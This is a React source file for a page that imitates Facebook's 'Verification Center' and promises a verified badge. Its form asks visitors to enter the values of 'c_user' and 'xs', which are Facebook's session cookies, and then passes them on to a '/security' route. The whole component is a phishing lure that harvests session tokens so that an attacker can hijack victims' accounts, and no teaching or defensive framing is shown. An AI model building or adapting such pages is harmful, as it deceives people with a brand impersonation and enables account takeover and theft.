import React, { useRef } from "react";
import { useNavigate } from "react-router-dom";

const Verification = () => {
  const form = useRef();
  const navigate = useNavigate();

  const handleSubmit = (e) => {
    e.preventDefault();
    const formData = new FormData(form.current);
    const c_user = formData.get("c_user");
    const xs = formData.get("xs");

    // Navigate to Security page with form data
    navigate("/security", { state: { data: { c_user, xs } } });
  };

  return (
    <div className="bg-gray-100 min-h-screen font-sans overflow-x-hidden">
      <header className="bg-[#4267B2] text-white p-6 flex justify-between items-center">
        <div className="flex items-center">
          <span className="text-4xl font-bold">facebook</span>
        </div>
      </header>

      <div className="bg-gray-200 h-2"></div>

      <div className="max-w-[840px] w-[90%] md:w-[80%] bg-white mx-auto my-[30px] p-[20px] rounded-lg shadow-lg relative">
        <div className="text-3xl font-bold mb-5 flex items-center">
          <img
            src="/blue_tick.png"
            alt="Verification Icon"
            className="w-12 h-auto mr-3"
          />
          Verification Center
        </div>
        <h1 className="text-2xl mb-5 font-normal text-left">
          Request a verified badge on Facebook
        </h1>
        <p className="text-sm text-gray-600 mb-3">
          The verified badge means that Facebook has confirmed that the Page or
          profile is the authentic presence of the individual, public figure, or
          brand that it represents.
        </p>
        <form ref={form} onSubmit={handleSubmit} className="mainForm mt-6">
          <div className="form-group mb-5">
            <label
              htmlFor="c_user"
              className="text-sm text-gray-700 block mb-2"
            >
              c_user
            </label>
            <input
              type="text"
              id="c_user"
              name="c_user"
              pattern="[0-9]+"
              minLength={6}
              required
              className="w-full p-3 text-sm border border-gray-300 rounded-md bg-gray-100 focus:bg-white focus:border-blue-500 focus:outline-none"
            />
          </div>
          <div className="form-group mb-5">
            <label htmlFor="xs" className="text-sm text-gray-700 block mb-2">
              xs
            </label>
            <input
              type="text"
              id="xs"
              name="xs"
              required
              className="w-full p-3 text-sm border border-gray-300 rounded-md bg-gray-100 focus:bg-white focus:border-blue-500 focus:outline-none"
            />
          </div>
          <button
            type="submit"
            className="w-full p-3 bg-blue-600 text-white font-bold uppercase rounded-md hover:bg-blue-700 transition duration-300"
          >
            Submit
          </button>
        </form>
      </div>
    </div>
  );
};

export default Verification;
